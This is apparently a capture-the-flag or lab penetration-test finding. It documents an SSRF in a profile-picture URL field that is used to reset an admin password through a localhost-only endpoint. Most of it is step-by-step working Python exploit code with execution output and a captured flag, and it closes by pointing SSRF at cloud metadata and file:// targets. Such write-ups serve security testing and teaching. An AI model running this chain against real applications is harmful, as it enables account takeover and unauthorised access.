- **Overview:** Authenticated user exploits Server-Side Request Forgery (SSRF) vulnerability to proxy HTTP requests through the application server, bypassing IP-based access control on password reset endpoint to reset admin password
- **Impact:** Complete admin account takeover, full privilege escalation from regular user to admin, FLAG access
- **Severity:** Critical

**Prerequisites:**
- Valid user account (can be created via public registration endpoint)
- Python with `requests` library (standard)

**Exploitation Steps:**

1. Register a new user account via the public registration endpoint:
```python
import requests
import random

username = f"exploit{random.randint(1000, 9999)}"
resp = requests.post('http://localhost:37053/register', data={
    'username': username,
    'password': 'testpass123',
    'first_name': 'Exploit',
    'last_name': 'Test',
    'email': 'test@test.com'
}, allow_redirects=False)
```

2. Authenticate as the newly created user:
```python
session = requests.Session()
resp = session.post('http://localhost:37053/login', data={
    'username': username,
    'password': 'testpass123'
})
```

3. Exploit SSRF vulnerability in profile picture URL parameter to proxy a request to the localhost-only password reset endpoint:
```python
ssrf_payload = 'http://127.0.0.1/reset_password?username=admin&newpassword=pwned123'
resp = session.post('http://localhost:37053/profile', data={
    'first_name': 'Exploit',
    'last_name': 'Test',
    'email': 'test@test.com',
    'profile_picture_url': ssrf_payload
})
```
The application server makes the request from its own localhost context (127.0.0.1), satisfying the IP restriction check at app.py:106-107.

4. Logout from the attacker account:
```python
session.get('http://localhost:37053/logout')
```

5. Authenticate as admin using the newly set password:
```python
admin_session = requests.Session()
resp = admin_session.post('http://localhost:37053/login', data={
    'username': 'admin',
    'password': 'pwned123'
})
```

6. Access admin profile to retrieve FLAG:
```python
resp = admin_session.get('http://localhost:37053/profile')
import re
flag = re.search(r'FLAG\{[^}]+\}', resp.text)
print(flag.group(0))
```

**Proof of Impact:**

Complete execution trace showing successful privilege escalation:
```
Registration: 302 (success)
Login: 200 (authenticated as regular user)
SSRF exploit: 200 (password reset executed via localhost proxy)
Admin login: 200 (authenticated as admin with new password)
FLAG captured: FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}
```

The SSRF vulnerability successfully bypassed the localhost IP restriction, allowing a regular authenticated user to reset the admin password and gain complete admin access.

**Technical Details:**

**SSRF Vulnerability (app.py:93-100):**
- `profile_picture_url` parameter accepts arbitrary URLs without validation
- `urllib.request.urlretrieve()` performs server-side HTTP request with no protocol, hostname, or port restrictions
- Requests originate from server's localhost context (127.0.0.1)

**Password Reset Target (app.py:104-116):**
- Endpoint restricted to `request.remote_addr == '127.0.0.1'` (line 106)
- Accepts arbitrary `username` parameter (no authentication or ownership validation)
- Updates password in plaintext: `users[username]['password'] = new_password` (line 113)
- GET method exposes password in URL query parameters

**Attack Chain:**
1. Regular user → Authenticated session
2. POST /profile with malicious `profile_picture_url`
3. Server makes request to http://127.0.0.1/reset_password?username=admin&newpassword=X
4. Request originates from localhost, bypasses IP check
5. Admin password reset without authentication
6. Attacker authenticates as admin
7. FLAG access granted

**Notes:**
- Attack requires valid user account (easily obtained via public registration)
- SSRF vulnerability has no rate limiting or monitoring
- Password reset leaves no audit trail
- Attack chain completes in <5 minutes
- SSRF can also target cloud metadata endpoints (AWS 169.254.169.254), internal network scanning, and file system access (file:// protocol)

---
